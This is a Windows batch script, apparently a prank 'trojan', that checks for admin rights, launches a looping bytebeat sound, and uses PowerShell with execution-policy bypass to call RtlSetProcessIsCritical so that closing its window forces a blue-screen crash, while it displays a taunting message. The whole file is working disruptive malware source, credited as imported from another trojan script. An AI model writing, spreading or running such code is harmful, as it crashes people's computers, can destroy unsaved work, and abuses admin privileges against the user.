@echo off
setlocal enabledelayedexpansion
title %~f0
for /f "tokens=1,2 delims=#" %%x in ('"prompt #$H#$E# & echo on & for %%b in (1) do rem"') do (set ESC=%%y)
if /i not "%~1" == "" (for /f "delims=-" %%p in ('echo %~1') do (call :%%p %2 %3 %4 %5 %6 %7 %8 %9))
goto WinMain

:SetProcessAsCritical
   :: Code imported from ADZP 20 Complex Trojan 5.0.bat
   powershell -ep Bypass -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class NativeMethods { [DllImport(\"ntdll.dll\", SetLastError = true)] public static extern int RtlSetProcessIsCritical(bool bNewValue, out bool pbOldValue, bool bCheckFlag); }'; $null = [NativeMethods]::RtlSetProcessIsCritical($true, [ref]$false, $false); Wait-Event;" >nul 2>nul
goto :eof

:PlayByteBeat
   set BBFRM="t * ((t / 2 >> 10 | t %% 16 * t >> 8) & 8 * t >> 12 & 18) | - (t / 16) + 64"
   set hz_rate=8000
   set duration=30
   powershell -nol -nop -noni -c "Add-Type -TypeDefinition 'using System; using System.IO; using System.Media; public class WinAPI { public static void PlaySequence() { int hz_rate = !hz_rate!; int duration = !duration!; int buffer = hz_rate * duration; byte[] b = new byte[buffer]; for (int t = 0; t < buffer; t++) b[t] = (byte)(!BBFRM!); using (var m = new MemoryStream()) { using (var w = new BinaryWriter(m)) { w.Write(new byte[] { 82, 73, 70, 70 }); w.Write(36 + b.Length); w.Write(new byte[] { 87, 65, 86, 69 }); w.Write(new byte[] { 102, 109, 116, 32 }); w.Write(16); w.Write((short)1); w.Write((short)1); w.Write(hz_rate); w.Write(hz_rate * 1); w.Write((short)1); w.Write((short)8); w.Write(new byte[] { 100, 97, 116, 97 }); w.Write(b.Length); w.Write(b); m.Position = 0; new SoundPlayer(m).PlaySync(); }}}}'; while ($true) { [WinAPI]::PlaySequence(); }" >nul 2>nul
goto :eof

:WinMain
   (net session >nul 2>nul) && (
   start /b "" cmd /c "%~f0" -PlayByteBeat
   start /b "" cmd /c "%~f0" -SetProcessAsCritical
   set dec[color]=255
   :Loop
      echo %ESC%[2f%ESC%[38;5;!dec[color]!m If you close this window, a blue screen of death will appear :D
      if !dec[color]! leq 231 (set /a dec[color]+=1) else (set dec[color]=16)
      powershell -ep Bypass -nol -nop -noni -c "Start-Sleep -Milliseconds 5"
    goto Loop
   ) || (
      color f
      echo.
      echo  I can't use SetProcessAsCritical because you not give me admin privileges.
      echo  7-7
      pause >nul
      exit
   )
goto :eof